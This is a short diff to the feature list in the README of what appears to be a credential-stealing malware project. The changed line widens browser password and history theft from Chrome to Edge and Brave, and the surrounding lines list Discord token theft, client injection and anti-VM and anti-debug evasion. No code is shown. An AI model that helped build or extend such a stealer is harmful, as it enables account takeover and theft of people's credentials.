@@ -12,7 +12,7 @@
 #### Features
 - 🟩 Discord tokens + In depth information
 - 🟩 System information
-- 🟩 Chrome passwords, cookies, history, and bookmarks (all profiles)
+- 🟩 Browser data from Google Chrome, Microsoft Edge, and Brave Browser (passwords, history, bookmarks)
 - 🟨 Other browser information
 - 🟩 Injection (Discord, Discord Canary, Discord PTB, Discord Development)
 - 🟩 Anti VM / Virus Scan / Debug
